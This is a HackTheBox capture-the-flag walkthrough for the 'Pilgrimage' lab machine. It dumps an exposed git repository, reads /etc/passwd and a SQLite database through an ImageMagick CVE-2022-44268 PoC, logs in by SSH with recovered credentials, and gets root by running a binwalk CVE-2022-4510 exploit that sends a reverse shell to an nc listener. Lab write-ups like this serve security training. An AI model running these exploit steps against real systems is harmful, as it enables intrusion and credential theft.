---
categories: [HackTheBox]
tags: [PrivEsc, Public Exploit, git]
image:
  path: /Vulnhub-Files/img/Pilgrimage/Untitled.png
  alt: Pilgrimage Machine !!
---



## Port Scan Results ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ sudo nmap -sC -sV -T4 10.10.11.219 -oN Nmap_results.txt
[sudo] password for kali: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-01 09:49 IST
Nmap scan report for 10.10.11.219
Host is up (0.17s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-vulners-regex: 
|   /main.shtml: 
|     cpe:/a:igor_sysoev:nginx:1.18.0
|_    cpe:/a:nginx:nginx:1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
{: .nolineno}

## Web Enumeration ⤵️

Now lets set the hosts file name as pilgrimage.htb for the IP address that we got and lets hover over the site now ⤵️

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%201.png)

After Directory Traversal I got the .git file so lets dump that with git-dumper Tool .

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ git-dumper http://pilgrimage.htb/.git /git            
Warning: Destination '.' is not empty
[-] Testing http://pilgrimage.htb/.git/HEAD [200]
[-] Testing http://pilgrimage.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://pilgrimage.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://pilgrimage.htb/.git/description [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-commit.sample [404]
[-] http://pilgrimage.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://pilgrimage.htb/.gitignore [404]
[-] http://pilgrimage.htb/.gitignore responded with status code 404
[-] Fetching http://pilgrimage.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://pilgrimage.htb/.git/hooks/pre-applypatch.sample [200]
...
```
{: .nolineno}

Now on git directory I got different files ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage/git]
└─$ ls
assets  dashboard.php  index.php  login.php  logout.php  magick  register.php  vendor
```
{: .nolineno}

I saw `magick` which is used in editing images so lets enum further :

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage/git]
└─$ ./magick -version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```
{: .nolineno}

Now lets find an exploit for this and I got it which I wanted ⤵️

1. https://github.com/Vulnmachines/imagemagick-CVE-2022-44268
2. https://www.exploit-db.com/exploits/51261
3. https://github.com/voidz0r/CVE-2022-44268

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ python3 poc.py                                       
usage: poc.py [-h] [-i INPUT] [-o OUTPUT] [-r READ] {generate,parse}
poc.py: error: the following arguments are required: action
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ python3 poc.py generate -o passwd.png -r /etc/passwd 
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ ls -al passwd.png 
-rw-r--r-- 1 kali kali 181 Sep  8 11:43 passwd.png
```
{: .nolineno}

Now lets upload this payload png file into the site and lets download the shrink image which we get after uploading this image ⤵️

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%202.png)

After uploading I got this image link so lets download this image now from this link ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ wget http://pilgrimage.htb/shrunk/64fabc0bacede.png                                  
--2023-09-08 11:47:01--  http://pilgrimage.htb/shrunk/64fabc0bacede.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1082 (1.1K) [image/png]
Saving to: ‘64fabc0bacede.png’

64fabc0bacede.png               100%[=======================================================>]   1.06K  --.-KB/s    in 0s      

2023-09-08 11:47:01 (44.5 MB/s) - ‘64fabc0bacede.png’ saved [1082/1082]
```
{: .nolineno}

Now lets read our `/etc/passwd` payload that we imbedded into the exploit image passwd.png ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ python3 poc.py parse -i 64fabc0bacede.png           
2023-09-08 14:10:52,191 - INFO - chunk IHDR found, value = b'\x00\x00\x00\x05\x00\x00\x00\x05\x08\x00\x00\x00\x00'
2023-09-08 14:10:52,191 - INFO - chunk gAMA found, value = b'\x00\x00\xb1\x8f'
2023-09-08 14:10:52,191 - INFO - chunk cHRM found, value = b'\x00\x00z&\x00\x00\x80\x84\x00\x00\xfa\x00\x00\x00\x80\xe8\x00\x00u0\x00\x00\xea`\x00\x00:\x98\x00\x00\x17p'
2023-09-08 14:10:52,191 - INFO - chunk bKGD found, value = b'\x00\xff'
2023-09-08 14:10:52,191 - INFO - chunk tIME found, value = b"\x07\xe7\t\x08\x06\x0f'"
2023-09-08 14:10:52,191 - INFO - chunk zTXt found, value = b'Raw profile type\x00\x00H\x89\xa5V\xe7\x15\xa30\x0c\xfe\xaf)n\x04p\x91\xf08\t!\xfb\x8fp\x9f\xe4JI\xc2\xbbK\x9e\xb1Q\xef\x86\xe8\x0f~s\xf0B\xe2\xf8\xcdo\t\xfe!\x8b\x7f\xf8)\xaf\x0eu\xef\xf1\xcc\x8e\x13o\xb6\xcf\xe2y\x99\x1e\x1cx\xe6\xc8/\x02\xd1V\x84\xccyUT\xc6@P\x14/\x0e\xbb\xcfb\xae`\xeeM\xbc\x81a\xc5\x12\x05@C!6\xd1.\xaf.\xe0\xb3(\x02\xf2 \n\x04I|\x11\xe5\xf3\xaa0P\x07\x8e\xc2gQd\x1e_\x88\x02\xac\nCt<\xfb\x88\xbf\xd7s\xc7\x8e\x16R\xf5\xb1\xa2\xe1\x9c F/\xe8\xad\x82\xa2\tB\nFL\xb7(C\xe9\x08\xee\xe1;E\xef\x05\x86\x1a=\xb6\xc4h\xfc\n\x141\x12F*U\xb2\x07\x08)\xe5\x88sA\xdfR\xb0\n\xac%\x93/yeP\x17\r\x11\x93\xd6\x10\xaf`\x07\x8e\xc3g\xd1t2>\xf1Z\xcc/\xabC\x07\xebG\x98\t\xa6\xafFo\x88\xa0\xb4\xa0\xa7\xbc:t\xb4\x9d\x06\xe3G\x82\x9f\x91\x01Ed\xaf\xa1\xc8]A\xd6]\xb3\xf5WC]Gi\x87\xff\xdd"2i\x93\xca"\xa9u\xa0\xaf\xcf\x11wl\x17\xfa\xe1\x80\xfd\xdcK\x1bY\xb0Z\xe3\xf8\xfa\xac\x14\xd4I\x06\x87\xecw\xb3\x8a\x9cU\xdf\x93@:5=\xa1>+:c\x87\xb4\x0f\xf0}Z\xe8[\xc52:\xbe\x8d<\xef\xdb3\x94*R:\x167\x05\x9cHIq\xb4\x96\xc0\x12\x94\x80\xdb\xd9\xd0\xc4}w\x94\x8a\xf6\x84|\xf4\x19\x94\xea3\xc3Kk8\xa4_\x99GX\x13M\x1f\x1d\x13\xb5P\x82\xf4\xa94\xd7gh8\xf8\xa2\xe25k\xd1\xc1\x19\x14\x1d\xf4\x85\xeas\xb4y\x88wLn7\xb9\x05.\x07t\x97*LG\xb79O\xa4\x8d\xaa\xd6[\xa9\xd6w\xbdSB+\xd769i?F\xf7\xa4E\x94\xf6\xe0\xc2\xd5\xc6\xed:\xf0\x17\xc3?\xbea\xe5\xd4\xd2\xae}8\xed\xd5]\xa9\xa0\xcf:>\xdd/9v\x1c\xd08*(\x88h\x84\x89\x9f\x83\xe6\xb9\xec\xce\x1f\x99\xa600\xf1s_yz!\x90\xda\xe3V\xfd\x8f\xb5\xb2\x17s\xc7^:\x1b,Z\x10^\x89\x90\xe68\xd8\xeb\xca\xee\xcf\xf6FG#\x134\xfe\xb3m\xc7\xe1\xafD\xbex\xee\xa4_\x92\xc5\x12\xdb\xd3U\xde\xe8[m\xfc\xce\x9bu\x83\xa9\xa7\xdd-\xaf\xfa\x82\xedy\x8a\x1f#Q\xd8r\x13)\x1f/\xf6\xf5\xb4\xe9\x18y\xd8\x84L\xfa\xfa?\xd9\xa3!B\xd1\x1as\x1d\xc6\xfeT\xaa\xba\x9d:MW\x8aK\xfem\x1f\x118\x0e"\xae>\xefN\x15\xed\xad,#:\x12\x90<\xaa\xc9n\xcfTnQ\xdbO5]\xd8p*\x8cu\x8a\xde\x9c\xd9V\x08\x0b\x8f\xcd\x1b\xcf\xcd[\xa3I\x9d\xfcN\xfa\xa3\xbe\xcd\xa0S\xc7\xd6\xf6M\x90|sm)\xf2\xfb\xec\x03\xb3;\xb0\r\xf1\x03\x1db\xea9N\x0f\xfa\x0b\xbab\xc7\xe0'
2023-09-08 14:10:52,192 - INFO - chunk IDAT found, value = b'\x08\xd7c<\xc3\xc0\xc0\xc0\xc0\xc2\xc0\xc4\xf0\xff?\x0b\xc3g\x06Vv&\xe6\xdf/Y\xff3\xfd\xfd\xcf\xfd\x8b\t\x00s?\t\xc7'
2023-09-08 14:10:52,192 - INFO - chunk tEXt found, value = b'date:create\x002023-09-08T06:15:39+00:00'
2023-09-08 14:10:52,192 - INFO - chunk tEXt found, value = b'date:modify\x002023-09-08T06:15:39+00:00'
2023-09-08 14:10:52,192 - INFO - chunk tEXt found, value = b'date:timestamp\x002023-09-08T06:15:39+00:00'
2023-09-08 14:10:52,192 - INFO - chunk IEND found, value = b''
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
{: .nolineno}

Now I got the output of /etc/passwd file as LFI so lets try to get a shell from this ->

I also checked the git files source code and I got this sqlite credentials path file inside register.php file ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage/git]
└─$ cat register.php       
<?php
session_start();
if(isset($_SESSION['user'])) {
  header("Location: /dashboard.php");
  exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['username'] && $_POST['password']) {
  $username = $_POST['username'];
  $password = $_POST['password'];

  $db = new PDO('sqlite:/var/db/pilgrimage');
  $stmt = $db->prepare("INSERT INTO `users` (username,password) VALUES (?,?)");
  $status = $stmt->execute(array($username,$password));

  if($status) {
    $_SESSION['user'] = $username;
    header("Location: /dashboard.php");
  }
  else {
    header("Location: /register.php?message=Registration failed&status=fail");
  }
}
?>
```
{: .nolineno}

Now lets acccess this file with previous method as we got /etc/passwd file ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ python3 poc.py generate -o sqlite_cred.png -r /var/db/pilgrimage
                                                                                                                                
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ wget http://pilgrimage.htb/shrunk/64fae8323d981.png                                  
--2023-09-08 14:54:04--  http://pilgrimage.htb/shrunk/64fae8323d981.png
Resolving pilgrimage.htb (pilgrimage.htb)... 10.10.11.219
Connecting to pilgrimage.htb (pilgrimage.htb)|10.10.11.219|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1117 (1.1K) [image/png]
Saving to: ‘64fae8323d981.png’

64fae8323d981.png               100%[=======================================================>]   1.09K  --.-KB/s    in 0s      

2023-09-08 14:54:05 (177 MB/s) - ‘64fae8323d981.png’ saved [1117/1117]

┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ identify -verbose 64faea203f664.png 
Image: 64faea203f664.png
  Format: PNG (Portable Network Graphics)
  Geometry: 5x5
  Class: PseudoClass
  Type: grayscale
  Depth: 8 bits-per-pixel component
  Channel Depths:
    Gray:     8 bits
  Channel Statistics:
    Gray:
      Minimum:                 43690.00 (0.6667)
      Maximum:                 53199.00 (0.8118)
      Mean:                    51245.80 (0.7820)
      Standard Deviation:       2376.38 (0.0363)
  Colors: 256
    0: (  0,  0,  0)	  black
    1: (  1,  1,  1)	  #010101
    2: (  2,  2,  2)	  #020202
    3: (  3,  3,  3)	  #030303
    4: (  4,  4,  4)	  #040404
    5: (  5,  5,  5)	  #050505
    6: (  6,  6,  6)	  #060606
... ... ...
   254: (254,254,254)	  #FEFEFE
    255: (255,255,255)	  white
  Gamma: 0.45455
  Chromaticity:
    red primary: (0.64,0.33)
    green primary: (0.3,0.6)
    blue primary: (0.15,0.06)
    white point: (0.3127,0.329)
  Filesize: 1.2Ki
  Interlace: No
  Orientation: Unknown
  Background Color: white
  Border Color: #DFDFDF
  Matte Color: #BDBDBD
  Page geometry: 5x5+0+0
  Compose: Over
  Dispose: Undefined
  Iterations: 0
  Compression: Zip
  Png:IHDR.color-type-orig: 0
  Png:IHDR.bit-depth-orig: 8
  Raw profile type: 

   20480
53514c69746520666f726d61742033001000010100402020000000540000000500000000
000000000000000400000004000000000000000000000001000000000000000000000000
000000000000000000000000000000000000000000000054002e4b910d0ff800040eba00
0f650fcd0eba0f3800000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000000000000000000000000000
...
6167652e6874622f736872756e6b2f363466616537643533353761652e706e67

  Date:create: 2023-09-08T09:32:16+00:00
  Date:modify: 2023-09-08T09:32:16+00:00
  Date:timestamp: 2023-09-08T09:32:16+00:00
  Signature: c5f89321fda9ed52d1b6fdba39f2865e833cf6354df82b6d27fcd4ce9e75f83b
  Tainted: False
  User Time: 0.010u
  Elapsed Time: 0m:0.000322s
  Pixels Per Second: 75.8Ki
```
{: .nolineno}

here I used the cyberchef tool to decode this much hex output into a sqlite format ⤵️

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%203.png)

Now I downloaded the sqlite file and opened it with sqlite Tools in kali and got the credentials ⤵️

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%204.png)

Now I have the credentials ⤵️

```bash
emily : abigchonkyboi123
```
{: .nolineno}

## SSH Login ⤵️

Now lets try to login with ssh :

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ ssh emily@pilgrimage.htb   
emily@pilgrimage.htb`s password: 
Linux pilgrimage 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
emily@pilgrimage:~$
```
{: .nolineno}

got the user.txt file ⤵️

```bash
emily@pilgrimage:~$ cat user.txt
b3e8c829c80641db2b04cce05a39febe
emily@pilgrimage:~$
```
{: .nolineno}

Now while checking the processes I Noticed this file ->

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%205.png)

***/bin/bash /usr/sbin/malwarescan.sh***

Now lets see what it is doing ->

```bash
emily@pilgrimage:/$ cat /usr/sbin/malwarescan.sh
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
	filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e  is/^.*CREATE //p')"
	binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
		if [[ "$binout" == *"$banned"*]]; then
			/usr/bin/rm "$filename"
			break
		fi
	done
done
emily@pilgrimage:/$ ls -al /usr/sbin/malwarescan.sh
-rwxr--r-- 1 root root 474 Jun  1 19:14 /usr/sbin/malwarescan.sh
emily@pilgrimage:/$
```
{: .nolineno}

Here this program is running binwalk so lets check which version of binwalk it is using ⤵️

```bash
emily@pilgrimage:/$ binwalk --help

Binwalk v2.3.2
Craig Heffner, ReFirmLabs
https://github.com/ReFirmLabs/binwalk

Usage: binwalk [OPTIONS] [FILE1] [FILE2] [FILE3] ...

Signature Scan Options:
    -B, --signature              Scan target file(s) for common file signatures
    -R, --raw=<str>              Scan target file(s) for the specified sequence of bytes
...
```
{: .nolineno}

Since it is version 2.3.2 and from web I got an exploit of this version only so lets try it out this exploit ⤵️ https://www.exploit-db.com/exploits/51249

![Untitled](/Vulnhub-Files/img/Pilgrimage/Untitled%206.png)

```bash
emily@pilgrimage:/tmp$ python3 exploit.py /var/www/pilgrimage.htb/shrunk/64faf96b8b4f4.png 10.10.14.25 4444

################################################
------------------CVE-2022-4510----------------
################################################
--------Binwalk Remote Command Execution--------
------Binwalk 2.1.2b through 2.3.2 included-----
------------------------------------------------
################################################
----------Exploit by: Etienne Lacoche-----------
---------Contact Twitter: @electr0sm0g----------
------------------Discovered by:----------------
---------Q. Kaiser, ONEKEY Research Lab---------
---------Exploit tested on debian 11------------
################################################

You can now rename and share binwalk_exploit and start your local netcat listener.

emily@pilgrimage:/tmp$ ls
binwalk_exploit.png
exploit.py
systemd-private-4dfeccbe37e14f1094cda99040197a4d-systemd-logind.service-fSWTvf
systemd-private-4dfeccbe37e14f1094cda99040197a4d-systemd-timesyncd.service-JCrdOi
vmware-root_581-3979839684
emily@pilgrimage:/tmp$
```
{: .nolineno}

Now lets copy this binwalk_exploit.png into the images location that is `/var/www/pilgrimage.htb/shrunk/` ⤵️

```bash
emily@pilgrimage:/tmp$ cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/
emily@pilgrimage:/tmp$
```
{: .nolineno}

Now in attackers machine lets start the Listener on port 4444 ⤵️

```bash
┌──(kali㉿kali)-[~/Downloads/HTB/Pilgrimage]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.25] from (UNKNOWN) [10.10.11.219] 51598
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@pilgrimage:~/quarantine# whoami
whoami
root
root@pilgrimage:~/quarantine# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pilgrimage:~/quarantine# cd /root
cd /root
root@pilgrimage:~# ls -al
ls -al
total 40
drwx------  5 root root 4096 Jun  8 00:10 .
drwxr-xr-x 18 root root 4096 Jun  8 00:10 ..
lrwxrwxrwx  1 root root    9 Feb 10  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root  571 Apr 11  2021 .bashrc
drwxr-xr-x  3 root root 4096 Jun  8 00:10 .config
-rw-r--r--  1 root root   93 Jun  7 20:11 .gitconfig
drwxr-xr-x  3 root root 4096 Jun  8 00:10 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
drwxr-xr-x  4 root root 4096 Sep  8 20:46 quarantine
-rwxr-xr-x  1 root root  352 Jun  1 19:13 reset.sh
-rw-r-----  1 root root   33 Sep  8 14:07 root.txt
root@pilgrimage:~# cat root.txt
cat root.txt
3abcaf52ed8d30173b8dc3c6fcb3461c
root@pilgrimage:~# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:1a:54 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.219/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
root@pilgrimage:~#
```
{: .nolineno}

I got the root !!



> If you have any questions or suggestions, please leave a comment below.
Thank You ! 
{: .prompt-tip }